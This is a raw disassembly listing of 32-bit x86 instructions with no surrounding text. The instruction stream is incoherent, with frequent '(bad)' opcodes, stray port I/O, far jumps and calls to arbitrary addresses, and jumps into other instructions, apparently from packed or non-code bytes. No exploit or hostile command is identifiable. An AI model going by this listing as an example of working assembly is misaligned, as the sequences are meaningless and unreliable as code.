  411810:	mov    cl,0x6d
  411812:	pop    ebx
  411813:	xchg   BYTE PTR [ebx+eax*4-0x2a45d073],ch
  41181a:	ror    DWORD PTR [edi-0x5279bb2c],0x69
  411821:	adc    esi,DWORD PTR [eax-0x43]
  411824:	add    eax,0x31cea2dc
  411829:	lds    ebp,FWORD PTR [ebp*8+0x7203aaf7]
  411830:	or     al,0xe
  411832:	(bad)  
  411833:	ins    BYTE PTR es:[edi],dx
  411834:	lahf   
  411835:	outs   dx,BYTE PTR ds:[esi]
  411836:	and    al,0x81
  411838:	mov    ch,0x8b
  41183a:	(bad)  
  41183b:	adc    ebx,DWORD PTR [eax+0x1a]
  41183e:	leave  
  41183f:	mov    bh,0xee
  411841:	out    0xf6,eax
  411843:	mov    dl,cl
  411845:	jp     0x41189a
  411847:	(bad)  
  411848:	mov    edx,0xfdcd5452
  41184d:	or     BYTE PTR [edi],dl
  41184f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411850:	icebp  
  411851:	das    
  411852:	xchg   DWORD PTR [ebx-0x6b9394ad],eax
  411858:	inc    esp
  411859:	jmp    0x98e82d91
  41185e:	popf   
  41185f:	popa   
  411860:	mov    edx,0xa217d098
  411865:	sub    al,0xa4
  411867:	and    dl,BYTE PTR [edi+0x2806ebec]
  41186d:	adc    al,0x5d
  41186f:	inc    edi
  411870:	(bad)  
  411871:	in     eax,0x55
  411873:	mov    al,0x25
  411875:	lahf   
  411876:	fwait
  411877:	mov    dh,0x61
  411879:	inc    ecx
  41187a:	fldenv [ebp+ebx*2+0x4a]
  41187e:	xlat   BYTE PTR ds:[ebx]
  41187f:	mov    dh,0xa9
  411881:	(bad)  
  411882:	in     eax,0x67
  411884:	lods   eax,DWORD PTR ds:[esi]
  411885:	jmp    0x411848
  411887:	js     0x411900
  411889:	pop    ebx
  41188a:	sub    bh,cl
  41188c:	pop    eax
  41188d:	pop    eax
  41188e:	add    al,0xca
  411890:	outs   dx,DWORD PTR ds:[esi]
  411891:	lds    edi,FWORD PTR ds:0x1e165f61
  411897:	int3   
  411898:	jp     0x4118d8
  41189a:	call   0xf440322f
  41189f:	inc    eax
  4118a0:	aad    0xc0
  4118a2:	sub    al,BYTE PTR ds:[ecx-0x264d9107]
  4118a9:	sbb    BYTE PTR [edx+0x262a8f0c],bh
  4118af:	jle    0x411885
  4118b1:	neg    DWORD PTR [edi-0x7dfe6ad4]
  4118b7:	daa    
  4118b8:	or     BYTE PTR [eax],cl
  4118ba:	icebp  
  4118bb:	and    DWORD PTR [ebp-0x56],edi
  4118be:	push   ebp
  4118bf:	xchg   ebx,eax
  4118c0:	push   ecx
  4118c1:	mov    ds:0x485430d9,al
  4118c6:	and    eax,0x84a4ad6e
  4118cb:	and    ecx,DWORD PTR [eax+edx*1+0x67c8ab0f]
  4118d2:	push   edx
  4118d3:	(bad)  
  4118d5:	xchg   ebx,eax
  4118d6:	out    0x3,eax
  4118d8:	pop    esi
  4118d9:	test   DWORD PTR [ecx-0x21],ecx
  4118dc:	mov    al,0x75
  4118de:	mov    bl,0x33
  4118e0:	aaa    
  4118e1:	(bad)  
  4118e2:	(bad)  [ebp+0x32774900]
  4118e8:	push   edi
  4118e9:	xlat   BYTE PTR ds:[ebx]
  4118ea:	push   ss
  4118eb:	or     BYTE PTR ds:[esi],dl
  4118ee:	mov    edx,0xa49f6789
  4118f3:	dec    edi
  4118f4:	lahf   
  4118f5:	stos   DWORD PTR es:[edi],eax
  4118f6:	sub    DWORD PTR [edx-0x2a14c54],eax
  4118fc:	jbe    0x4118b0
  4118fe:	mov    al,0x2f
  411900:	add    DWORD PTR [edi-0x1],0xfdef9d83
  411907:	mov    cs,WORD PTR [eax]
  411909:	in     eax,0xb0
  41190b:	jp     0x41192a
  41190d:	add    bl,BYTE PTR [eax+ecx*2]
  411910:	xor    dl,bh
  411912:	push   es
  411913:	and    eax,DWORD PTR [ebp-0x69c492cb]
  411919:	push   esp
  41191a:	jo     0x4118d6
  41191c:	leave  
  41191d:	push   edi
  41191e:	mov    dl,0xf2
  411920:	js     0x41194b
  411922:	pop    ecx
  411923:	std    
  411924:	jecxz  0x4118bc
  411926:	xchg   ebx,eax
  411927:	(bad)  
  411928:	push   0x33
  41192a:	pop    eax
  41192b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41192c:	popf   
  41192d:	je     0x411953
  41192f:	inc    esi
  411930:	sub    BYTE PTR [edi-0x1c75b882],ah
  411936:	mov    DWORD PTR [eax-0x45],ecx
  411939:	outs   dx,BYTE PTR ds:[esi]
  41193a:	cmp    esi,DWORD PTR [ecx]
  41193c:	xchg   edx,ecx
  41193e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193f:	cwde   
  411940:	inc    edi
  411941:	shl    DWORD PTR ds:0x9043fb29,cl
  411947:	mov    esp,DWORD PTR [edx+0x6b]
  41194a:	sub    BYTE PTR [edi-0x21],al
  41194d:	inc    eax
  41194e:	(bad)  
  41194f:	and    ah,BYTE PTR [esi+0x2a]
  411952:	jae    0x4119a2
  411954:	jo     0x41195f
  411956:	fsub   st,st(4)
  411958:	adc    cl,BYTE PTR [edx]
  41195a:	arpl   WORD PTR [edx-0x71],bp
  41195d:	pop    ebx
  41195e:	jne    0x4119cf
  411960:	fstp   QWORD PTR [esi-0x4f]
  411963:	scas   al,BYTE PTR es:[edi]
  411964:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411966:	push   es
  411967:	pop    ebx
  411968:	or     al,0xa6
  41196a:	mov    WORD PTR [eax+0x6c90762a],gs
  411970:	ja     0x4119b2
  411972:	iret   
  411973:	call   0x32bc:0x729470ea
  41197a:	inc    edx
  41197b:	pop    ecx
  41197c:	xor    BYTE PTR [ebx],dl
  41197e:	in     eax,0xb8
  411980:	fmul   DWORD PTR [ebx+0x508a4c91]
  411986:	(bad)  
  411987:	push   ds
  411988:	xchg   ebx,eax
  411989:	mov    al,ds:0xfbc031d
  41198e:	pop    esp
  41198f:	lods   eax,DWORD PTR ds:[esi]
  411990:	out    0xf0,al
  411992:	cmp    al,0xd6
  411994:	pushf  
  411995:	inc    edx
  411996:	inc    eax
  411997:	jbe    0x411966
  411999:	loop   0x41192b
  41199b:	mov    cl,0x24
  41199d:	mov    al,0x87
  41199f:	jo     0x411941
  4119a1:	daa    
  4119a2:	repnz inc esp
  4119a4:	iret   
  4119a5:	fnsave [edi]
  4119a7:	js     0x411990
  4119a9:	mov    cs,WORD PTR [ebx+ebp*8+0x8217949]
  4119b0:	mov    ebp,0xc6a1713e
  4119b5:	mov    ebx,0x924c5416
  4119ba:	pop    esi
  4119bb:	dec    eax
  4119bc:	out    dx,al
  4119bd:	mov    al,ds:0xb2e8bf10
  4119c2:	(bad)  
  4119c3:	and    al,0xf7
  4119c5:	int3   
  4119c6:	je     0x411a0f
  4119c8:	xor    BYTE PTR [edx+0x62d28837],bl
  4119ce:	stos   DWORD PTR es:[edi],eax
  4119cf:	xchg   ecx,eax
  4119d0:	inc    edx
  4119d1:	shr    BYTE PTR [edi],cl
  4119d3:	xchg   esi,eax
  4119d4:	push   ebx
  4119d5:	mov    bh,BYTE PTR [edx-0x7821e733]
  4119db:	mov    ecx,ebx
  4119dd:	xchg   ecx,eax
  4119de:	fistp  DWORD PTR [edx+edi*1+0x5f]
  4119e2:	jmp    0x465b:0x68c7db73
  4119e9:	or     eax,0x79e8d07d
  4119ee:	gs dec ebx
  4119f0:	mov    ebx,0x78ee3772
  4119f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f6:	push   es
  4119f7:	aam    0x57
  4119f9:	cs sahf 
  4119fb:	jmp    0x4119a2
  4119fd:	dec    esp
  4119fe:	mov    eax,ds:0xcdd71e4c
  411a03:	inc    ebx
  411a04:	add    eax,0xa7f0b288
  411a09:	jmp    eax
  411a0b:	jmp    DWORD PTR [esp+ecx*2-0x69]
  411a0f:	jo     0x4119c6
  411a11:	add    ah,al
  411a13:	test   cl,al
  411a15:	and    eax,0x4b34a6e7
  411a1a:	enter  0x99fe,0x59
  411a1e:	(bad)  
  411a1f:	jmp    0x4119fa
  411a21:	pop    ds
  411a22:	cmp    cl,bl
  411a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a25:	rcr    BYTE PTR [esi-0x5a41c472],cl
  411a2b:	sbb    ebp,DWORD PTR [esi+0x59]
  411a2e:	pop    ecx
  411a2f:	mov    ebx,0x76ff56c1
  411a34:	mov    cl,0xaa
  411a36:	sub    eax,0x93d6b7a3
  411a3b:	and    DWORD PTR [esp+ebp*1-0x28d2645b],esp
  411a42:	mov    bl,0xf5
  411a44:	fsub   DWORD PTR ds:0x90807d39
  411a4a:	pop    esp
  411a4b:	inc    ebx
  411a4c:	mov    al,0x83
  411a4e:	mov    esi,0x7a3bf8d9
  411a53:	sar    DWORD PTR [ecx],1
  411a55:	jnp    0x411ac0
  411a57:	dec    BYTE PTR [ebp+0x5d99b3b6]
  411a5d:	inc    esp
  411a5e:	fwait
  411a5f:	xor    eax,0x6c52f3e9
  411a64:	in     eax,dx
  411a65:	shl    DWORD PTR [ebp-0x4c],0x8c
  411a69:	and    DWORD PTR [edi-0x30],0xbd975b53
  411a70:	je     0x411a15
  411a72:	into   
  411a73:	fs mov eax,0x847a6e7
  411a79:	pop    esp
  411a7a:	mov    al,ds:0xd105b93
  411a7f:	lds    edx,FWORD PTR [ebp-0x386ecb8b]
  411a85:	jae    0x411a70
  411a87:	arpl   WORD PTR [edx-0x4a21c7a4],si
  411a8d:	aam    0xa8
  411a8f:	mov    ebx,0xe6ec92d
  411a94:	mov    eax,ds:0x82fff616
  411a99:	test   BYTE PTR [esi-0x66],al
  411a9c:	push   edi
  411a9d:	test   BYTE PTR [ecx],dl
  411a9f:	cld    
  411aa0:	cmp    al,0xa4
  411aa2:	shl    esi,1
  411aa4:	dec    edx
  411aa5:	pop    ss
  411aa6:	sbb    eax,0x104fe7fd
  411aab:	test   eax,0xd80ab7ff
  411ab0:	repz les ebp,FWORD PTR [esi]
  411ab3:	loop   0x411abb
  411ab5:	add    BYTE PTR [edi+0x2139ce9d],bh
  411abb:	jp     0x411a94
  411abd:	retf   0x2304
  411ac0:	loope  0x411b41
  411ac2:	mov    esi,0x1ba5434b
  411ac7:	cwde   
  411ac8:	int3   
  411ac9:	cdq    
  411aca:	or     al,0x82
  411acc:	mov    bh,0x79
  411ace:	inc    esp
  411acf:	test   cl,al
  411ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad2:	fwait
  411ad3:	(bad)  
  411ad4:	mov    ah,0x84
  411ad6:	mov    edi,0x73dff951
  411adb:	sub    eax,0x90710415
  411ae0:	and    al,0xd7
  411ae2:	or     DWORD PTR [edi-0x72],0x1719324d
  411ae9:	je     0x411afd
  411aeb:	call   0x2b41:0x34a581cf
  411af2:	inc    edi
  411af3:	sub    ah,bh
  411af5:	xlat   BYTE PTR ds:[ebx]
  411af6:	test   esp,edx
  411af8:	jbe    0x411aa8
  411afa:	pop    ds
  411afb:	push   esp
  411afc:	movaps xmm5,xmm7
  411aff:	dec    ebx
  411b00:	or     DWORD PTR [ebp+0x49c3e276],ebx
  411b06:	jno    0x411b20
  411b08:	in     al,dx
  411b09:	sbb    eax,0x45dc4ef1
  411b0e:	and    eax,0xc2769e22
  411b13:	jmp    0x411b70
  411b15:	out    0x75,al
  411b17:	popf   
  411b18:	lods   eax,DWORD PTR ds:[esi]
  411b19:	push   ds
  411b1a:	cmp    eax,0x4ead79b6
  411b1f:	shl    BYTE PTR [ebp-0x3e],cl
  411b22:	jg     0x411b27
  411b24:	mov    bh,0x53
  411b26:	add    esp,DWORD PTR [edx-0x50]
  411b29:	f2xm1  
  411b2b:	(bad)  
  411b2c:	and    eax,DWORD PTR [esi-0x6f4e5e03]
  411b32:	jb     0x411b5b
  411b34:	jbe    0x411b31
  411b36:	cmp    eax,0x5af5b3ff
  411b3b:	retf   
  411b3c:	jnp    0x411b7d
  411b3e:	into   
  411b3f:	js     0x411ad0
  411b41:	(bad)  
  411b42:	jl     0x411bae
  411b44:	add    DWORD PTR [esi+eax*8+0x17bf7d13],0x44e8beb3
  411b4f:	cmc    
  411b50:	mov    ds:0x1a7c9e0f,al
  411b55:	add    BYTE PTR [esi],ch
  411b57:	nop
  411b58:	loop   0x411af9
  411b5a:	rcl    BYTE PTR [eax],0xec
  411b5d:	mov    ch,0xb5
  411b5f:	mov    WORD PTR [ebp-0x11f2111c],?
  411b65:	pop    eax
  411b66:	push   ecx
  411b67:	sbb    al,0xf1
  411b69:	cmp    eax,0xcf367d65
  411b6e:	jo     0x411ba5
  411b70:	jmp    0x411b83
  411b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b73:	jg     0x411b57
  411b75:	cmp    edi,DWORD PTR [ecx+0x1]
  411b78:	ret    0x1bb2
  411b7b:	data16 or al,0x34
  411b7e:	ins    BYTE PTR es:[edi],dx
  411b7f:	push   ebp
  411b80:	or     DWORD PTR [esi-0x34],0x15013b8a
  411b87:	mov    edi,0x66eaaad9
  411b8c:	sbb    bl,BYTE PTR [eax+0x69]
  411b8f:	and    al,0x10
  411b91:	mov    ch,0x90
  411b93:	in     al,0xad
  411b95:	stos   BYTE PTR es:[edi],al
  411b96:	mov    eax,ds:0xd4889140
  411b9b:	sbb    eax,0x638c84c8
  411ba0:	addr16 (bad) 
  411ba2:	xor    dh,BYTE PTR [esi+eax*8]
  411ba5:	cmp    ecx,ebx
  411ba7:	pop    ecx
  411ba8:	enter  0xaf85,0xd
  411bac:	jae    0x411bcc
  411bae:	xchg   esi,eax
  411baf:	fdivr  st,st(0)
  411bb1:	add    eax,0x2b8a2095
  411bb6:	sub    BYTE PTR [esi+0xe],dh
  411bb9:	outs   dx,DWORD PTR ds:[esi]
  411bba:	pop    esi
  411bbb:	sbb    bh,BYTE PTR [ecx]
  411bbd:	mov    edi,0x9f4f565e
  411bc3:	dec    eax
  411bc4:	fadd   DWORD PTR [ecx]
  411bc6:	jne    0x411c19
  411bc8:	cmc    
  411bc9:	das    
  411bca:	cmp    al,0x89
  411bcc:	sub    al,0x81
  411bce:	aas    
  411bcf:	or     bh,bl
  411bd1:	test   ah,dl
  411bd3:	xchg   si,ax
  411bd5:	cli    
  411bd6:	sub    BYTE PTR [edi+eax*2],bl
  411bd9:	xor    ebp,ebx
  411bdb:	pop    edi
  411bdc:	and    eax,0x160dfcea
  411be1:	mov    bl,0xec
  411be3:	loop   0x411b7b
  411be5:	iret   
  411be6:	repz ss loopne 0x411c03
  411bea:	cmp    al,0x71
  411bec:	pusha  
  411bed:	cli    
  411bee:	popf   
  411bef:	int3   
  411bf0:	(bad)  
  411bf2:	push   DWORD PTR ds:0x529e1e9e
  411bf8:	jg     0x411b9c
  411bfa:	push   ebp
  411bfb:	add    ebx,DWORD PTR [edi+0x11e47ef8]
  411c01:	push   0x4c
  411c03:	push   ss
  411c04:	sub    cl,cl
  411c06:	test   DWORD PTR [ecx+esi*1-0x2661af1e],edi
  411c0d:	sbb    bl,BYTE PTR [ebp+0x50]
  411c10:	cmp    eax,0xf8076f81
  411c15:	and    ebx,DWORD PTR [ecx-0x7e1c83e4]
  411c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c1c:	pop    esi
  411c1d:	ins    DWORD PTR es:[edi],dx
  411c1e:	xchg   esp,eax
  411c1f:	stc    
  411c20:	stos   DWORD PTR es:[edi],eax
  411c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c22:	dec    esp
  411c23:	clc    
  411c24:	test   DWORD PTR [edx*1-0x5853adcc],ecx
  411c2b:	push   esi
  411c2c:	enter  0x8511,0x45
  411c30:	int3   
  411c31:	dec    edx
  411c32:	repnz fpatan 
  411c35:	or     eax,0x51b8eb6d
  411c3a:	out    0x7e,al
  411c3c:	jecxz  0x411c25
  411c3e:	pop    edx
  411c3f:	mov    edx,DWORD PTR [ecx]
  411c41:	imul   esp,esi,0xffffffb1
  411c44:	ror    BYTE PTR [edx+eiz*2+0x22],0xee
  411c49:	cmp    BYTE PTR [edi],al
  411c4b:	test   DWORD PTR ds:0xa5ceb3aa,esp
  411c52:	outs   dx,DWORD PTR ds:[esi]
  411c53:	into   
  411c54:	inc    BYTE PTR [edi]
  411c56:	mov    ds:0xf46af3fe,al
  411c5b:	scas   eax,DWORD PTR es:[edi]
  411c5c:	xor    ecx,DWORD PTR [ecx-0x3d0a6c17]
  411c62:	stc    
  411c63:	icebp  
  411c64:	push   ss
  411c65:	aaa    
  411c66:	and    eax,DWORD PTR [ebx]
  411c68:	int    0x57
  411c6a:	cld    
  411c6b:	(bad)  
  411c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c6d:	in     al,0x5d
  411c6f:	test   BYTE PTR [edx],bh
  411c71:	lock sbb DWORD PTR [ebx-0x29],ebx
  411c75:	std    
  411c76:	neg    DWORD PTR [esi-0x4ed78cb8]
  411c7c:	call   DWORD PTR [eax+ecx*8+0x45a0e198]
  411c83:	fistp  DWORD PTR [ebp+0x21221a4d]
  411c89:	dec    esp
  411c8a:	push   ebp
  411c8b:	cmp    edx,esp
  411c8d:	pop    esi
  411c8e:	mov    esi,0xb7adf2c0
  411c93:	stos   DWORD PTR es:[edi],eax
  411c94:	stos   DWORD PTR es:[edi],eax
  411c95:	xchg   esi,eax
  411c96:	div    DWORD PTR ds:0xc9c8ef63
  411c9c:	xchg   ecx,eax
  411c9d:	jae    0x411c4f
  411c9f:	cmp    al,0x88
  411ca1:	je     0x411d0a
  411ca3:	mov    al,0x1a
  411ca5:	dec    ebp
  411ca6:	mov    bl,BYTE PTR [ebp+0x9f32b00]
  411cac:	jns    0x411c53
  411cae:	retf   0x38d2
  411cb1:	and    BYTE PTR [esi],0x73
  411cb4:	clc    
  411cb5:	xlat   BYTE PTR ds:[ebx]
  411cb6:	sbb    DWORD PTR [esi+0x631d4c49],esp
  411cbc:	inc    eax
  411cbd:	add    al,0xac
  411cbf:	lods   al,BYTE PTR ds:[esi]
  411cc0:	arpl   WORD PTR ds:0x876d970c,sp
  411cc6:	ja     0x411cab
  411cc8:	pop    esi
  411cc9:	loop   0x411c57
  411ccb:	mov    bh,0x2b
  411ccd:	rol    esi,1
  411ccf:	in     al,dx
  411cd0:	push   eax
  411cd1:	in     eax,0x40
  411cd3:	(bad)  
  411cd4:	rol    BYTE PTR ds:0xae802aa4,0x30
  411cdb:	xchg   esp,eax
  411cdc:	xchg   edi,eax
  411cdd:	mov    edx,0x728de2ec
  411ce2:	(bad)  
  411ce3:	xor    ch,BYTE PTR [eax+0x29773f3]
  411ce9:	xor    al,0x84
  411ceb:	push   eax
  411cec:	mov    edx,0x6912351
  411cf1:	cmp    cl,BYTE PTR [ebp+eax*2-0x3c02f49c]
  411cf8:	fisubr WORD PTR [ecx-0x6c0d488f]
  411cfe:	shl    dh,0x7a
  411d01:	fs jne 0x411d34
  411d04:	das    
  411d05:	push   0x4602cd6a
  411d0a:	jmp    0x411d23
  411d0c:	jmp    0x81cdd15
  411d11:	ret    0x9cd9
  411d14:	inc    ecx
  411d15:	cmp    DWORD PTR [ebp-0x4764eade],edi
  411d1b:	(bad)  [esi-0x6f]
  411d1e:	les    edx,FWORD PTR [edx+ecx*1]
  411d21:	fmul   st,st(5)
  411d23:	pop    edi
  411d24:	fdivr  st(3),st
  411d26:	pop    edx
  411d27:	xchg   ebx,eax
  411d28:	fld    DWORD PTR [edx]
  411d2a:	repnz pop eax
  411d2c:	pcmpeqb mm4,mm6
  411d2f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  411d31:	add    eax,0x2008a317
  411d36:	pop    eax
  411d37:	push   0xffffffb7
  411d39:	out    0x20,al
  411d3b:	cld    
  411d3c:	push   ebp
  411d3d:	out    0x75,eax
  411d3f:	fs test al,0xa3
  411d42:	and    esp,DWORD PTR ds:0x24e67a45
  411d48:	loopne 0x411d74
  411d4a:	test   DWORD PTR [ebp+0x3ea7c7d0],eax
  411d50:	mov    edx,0xbd995d48
  411d55:	pop    ebx
  411d56:	mov    ch,0x62
  411d58:	out    0x88,al
  411d5a:	mov    eax,DWORD PTR [edx+eax*8+0x13]
  411d5e:	xor    DWORD PTR [eax+0x66f5d968],edi
  411d64:	pop    ecx
  411d65:	scas   al,BYTE PTR es:[edi]
  411d66:	pop    es
  411d67:	adc    al,0x81
  411d69:	xlat   BYTE PTR ds:[ebx]
  411d6a:	ret    
  411d6b:	daa    
  411d6c:	inc    ebp
  411d6d:	jmp    0x56fcdaf4
  411d72:	sub    eax,0xe3b747e2
  411d77:	je     0x411da6
  411d79:	pop    edx
  411d7a:	dec    esi
  411d7b:	fwait
  411d7c:	push   0x52
  411d7e:	mov    si,0x31fc
  411d82:	rcl    DWORD PTR [edi+0x4c],cl
  411d85:	push   DWORD PTR ds:0x3ceb9382
  411d8b:	mov    BYTE PTR [ecx-0x1f],dl
  411d8e:	ss pop eax
  411d90:	ret    
  411d91:	pusha  
  411d92:	dec    ebp
  411d93:	std    
  411d94:	cmp    DWORD PTR [ebx],edx
  411d96:	mov    al,ds:0xabef940a
  411d9b:	xchg   ebx,eax
  411d9c:	cld    
  411d9d:	mov    BYTE PTR [ecx-0x49333675],al
  411da3:	cmp    cl,dh
  411da5:	sub    DWORD PTR [esp+ecx*8-0x68],esi
  411da9:	nop
  411daa:	inc    eax
  411dab:	and    eax,eax
  411dad:	imul   ecx,DWORD PTR [ebx+0x259d1425],0x4dcea19c
  411db7:	mov    eax,0xb28199d
  411dbc:	or     esp,esi
  411dbe:	mov    bl,0xed
  411dc0:	jecxz  0x411dba
  411dc2:	push   ebx
  411dc3:	fistp  DWORD PTR [ebp-0x4d]
  411dc6:	les    ebp,FWORD PTR [ecx+0x54]
  411dc9:	sbb    DWORD PTR [ebp+edx*8+0x4b3753d1],eax
  411dd0:	mov    cl,0xfa
  411dd2:	arpl   WORD PTR [eax+edx*4],si
  411dd5:	mov    DWORD PTR [eax+0x78c278c],esp
  411ddb:	mov    ds:0x57877e67,al
  411de0:	out    0x50,al
  411de2:	fild   WORD PTR [edi+eax*8+0x5a89db54]
  411de9:	inc    esi
  411dea:	pop    ebx
  411deb:	loop   0x411d81
  411ded:	aaa    
  411dee:	mov    al,0xa2
  411df0:	inc    ecx
  411df1:	ret    
  411df2:	fwait
  411df3:	cmp    eax,DWORD PTR [ecx-0x2344adfc]
  411df9:	cmc    
  411dfa:	lds    eax,FWORD PTR [ebx+0x24c91b8d]
  411e00:	mov    eax,ds:0xfd94cbb8
  411e05:	xchg   esp,eax
  411e06:	jp     0x411dfa
  411e08:	ficom  DWORD PTR [eax]
  411e0a:	out    dx,al
  411e0b:	dec    ebp
  411e0c:	adc    ebp,esp
  411e0e:	lods   al,BYTE PTR ds:[esi]
  411e0f:	repz mov al,0x21
  411e12:	xchg   ebx,eax
  411e13:	aaa    
  411e14:	add    eax,DWORD PTR [ecx]
  411e16:	mov    WORD PTR [ebx],fs
  411e18:	enter  0xcb70,0x65
  411e1c:	dec    ebx
  411e1d:	sub    BYTE PTR [ecx-0x2b],ah
  411e20:	sar    dl,cl
  411e22:	sbb    BYTE PTR [ebx-0x2d0b6fa1],cl
  411e28:	lods   al,BYTE PTR ds:[esi]
  411e29:	in     eax,0x2e
  411e2b:	dec    edx
  411e2c:	in     eax,dx
  411e2d:	pop    esi
  411e2e:	outs   dx,BYTE PTR ds:[esi]
  411e2f:	retf   0x7d88
  411e32:	shl    dl,cl
  411e34:	or     bh,BYTE PTR [ebp+0x633dd026]
  411e3a:	push   0x6d38eacf
  411e3f:	sbb    ecx,DWORD PTR [edi+0x2aeb1bc3]
  411e45:	aaa    
  411e46:	cmc    
  411e47:	sti    
  411e48:	xchg   eax,eax
  411e4a:	and    dh,dh
  411e4c:	shl    edi,cl
  411e4e:	adc    BYTE PTR ds:0x385e8156,0xfe
  411e55:	push   ds
  411e56:	scas   eax,DWORD PTR es:[edi]
  411e57:	mov    dh,0xc0
  411e59:	mov    ebx,0x2d357679
  411e5e:	enter  0x6249,0x63
  411e62:	hlt    
  411e63:	xchg   esi,eax
  411e64:	aad    0xcb
  411e66:	je     0x411df2
  411e68:	out    0x6f,ax
  411e6b:	sbb    ebp,DWORD PTR [ebp-0x2390ffd5]
  411e71:	iret   
  411e72:	outs   dx,DWORD PTR ds:[esi]
  411e73:	fdiv   DWORD PTR [ecx]
  411e75:	outs   dx,BYTE PTR ds:[esi]
  411e76:	xchg   ebp,eax
  411e77:	xchg   ebp,eax
  411e78:	mov    bl,0x95
  411e7a:	loopne 0x411e49
  411e7c:	sub    eax,0xfb077328
  411e81:	fisubr WORD PTR [eax]
  411e83:	(bad)  
  411e84:	mov    ah,0x5f
  411e86:	mov    bl,0x39
  411e88:	cdq    
  411e89:	xchg   esi,eax
  411e8a:	dec    esi
  411e8b:	jns    0x411e95
  411e8d:	add    eax,0xa6a4cdbd
  411e92:	out    0x8d,eax
  411e94:	scas   eax,DWORD PTR es:[edi]
  411e95:	fcomi  st,st(5)
  411e97:	push   cs
  411e98:	xor    al,0x38
  411e9a:	xchg   edi,eax
  411e9b:	push   ds
  411e9c:	ret    
  411e9d:	daa    
  411e9e:	popf   
  411e9f:	and    DWORD PTR [ebx+0x2a],ebp
  411ea2:	gs mov eax,0xfb00361
  411ea8:	cmc    
  411ea9:	sbb    ch,BYTE PTR [ebp+0x2e5a656a]
  411eaf:	fs jmp 0xd91c:0x7e49953e
  411eb7:	ret    0x104f
  411eba:	inc    ecx
  411ebb:	ret    
  411ebc:	(bad)  
  411ebd:	into   
  411ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ebf:	jg     0x411e52
  411ec1:	sub    al,0x85
  411ec3:	in     al,0x3d
  411ec5:	enter  0x4c7b,0xc0
  411ec9:	sub    eax,0xff18bcf
  411ece:	jg     0x411eb9
  411ed0:	mov    bh,0xc2
  411ed2:	icebp  
  411ed3:	lods   al,BYTE PTR ds:[esi]
  411ed4:	test   eax,0xdf6d2813
  411ed9:	into   
  411eda:	mov    ecx,DWORD PTR [edi]
  411edc:	clc    
  411edd:	mov    esi,0x354a281b
  411ee2:	int3   
  411ee3:	inc    ebp
  411ee4:	cdq    
  411ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ee6:	sub    DWORD PTR [eax+0x3dee80eb],ebp
  411eec:	dec    edi
  411eed:	in     eax,0xa6
  411eef:	hlt    
  411ef0:	ret    0x36b3
  411ef3:	pop    ss
  411ef4:	in     al,dx
  411ef5:	dec    esp
  411ef6:	clc    
  411ef7:	add    DWORD PTR [ecx],esp
  411ef9:	jbe    0x411eb6
  411efb:	sub    ebp,DWORD PTR [eax+0x78]
  411efe:	int3   
  411eff:	mov    edx,0xa675d916
  411f04:	dec    esi
  411f05:	cmp    edi,DWORD PTR [ebx-0x2dda2f21]
  411f0b:	das    
  411f0c:	mov    esi,0x56324c36
  411f11:	jge    0x411ea5
  411f13:	push   esp
  411f14:	mov    ebp,0x55d2a45f
  411f19:	fist   DWORD PTR es:[ecx+0x6b4ece33]
  411f20:	rcr    DWORD PTR [ecx+esi*1+0x1e742a54],0x46
  411f28:	dec    eax
  411f29:	fst    DWORD PTR [ebx]
  411f2b:	or     ebp,DWORD PTR [edi]
  411f2d:	rcl    dl,cl
  411f2f:	add    edx,esi
  411f31:	popa   
  411f32:	add    al,0x31
  411f34:	int3   
  411f35:	aam    0xba
  411f37:	and    al,0xb7
  411f39:	nop
  411f3a:	sar    DWORD PTR [edx+0x1e],1
  411f3d:	mov    ds:0xcbc87bc3,eax
  411f42:	xchg   edi,eax
  411f43:	cmc    
  411f44:	jp     0x411f6e
  411f46:	(bad)  
  411f47:	test   al,0xa3
  411f49:	(bad)  
  411f4a:	call   0x6d31:0xcaf78e20
  411f51:	sub    eax,0x3fb5c3c
  411f56:	pop    ebp
  411f57:	dec    eax
  411f58:	js     0x411f90
  411f5a:	inc    esp
  411f5b:	icebp  
  411f5c:	jbe    0x411f33
  411f5e:	sub    dh,BYTE PTR [edx-0x6e]
  411f61:	(bad)  
  411f62:	fldenv [ebp+0x21f2e62]
  411f68:	add    dl,BYTE PTR [edx]
  411f6a:	mov    eax,ds:0xd0b2d255
  411f6f:	push   ds
  411f70:	mov    ds:0xc1ca6636,al
  411f75:	or     DWORD PTR [edi-0x1f],esi
  411f78:	push   ecx
  411f79:	jbe    0x411f2b
  411f7b:	(bad)  
  411f7d:	lds    eax,FWORD PTR [esi-0x5fb9de81]
  411f83:	jae    0x411f5a
  411f85:	or     BYTE PTR [ecx+0x69],ch
  411f88:	inc    eax
  411f89:	mov    ebx,0xfabcf8b1
  411f8e:	inc    ecx
  411f8f:	pop    ds
  411f90:	add    DWORD PTR [esi+0x3022440f],ebp
  411f96:	pop    esp
  411f97:	jno    0x411f85
  411f99:	lods   eax,DWORD PTR ds:[esi]
  411f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f9b:	pop    esp
  411f9c:	sbb    ebx,DWORD PTR [ebx]
  411f9e:	mov    eax,ds:0x4d1933a6
  411fa3:	rcr    DWORD PTR [ebx-0x52],0xda
  411fa7:	mov    bh,0x7d
  411fa9:	into   
  411faa:	ins    DWORD PTR es:[edi],dx
  411fab:	jp     0x411ffe
  411fad:	fistp  DWORD PTR [edx+0xf85f992]
  411fb3:	jnp    0x411f44
  411fb5:	je     0x411fee
  411fb7:	je     0x411fcd
  411fb9:	call   0xf694:0xcf7e9ec2
  411fc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fc1:	scas   eax,DWORD PTR es:[edi]
  411fc2:	jb     0x412014
  411fc4:	inc    eax
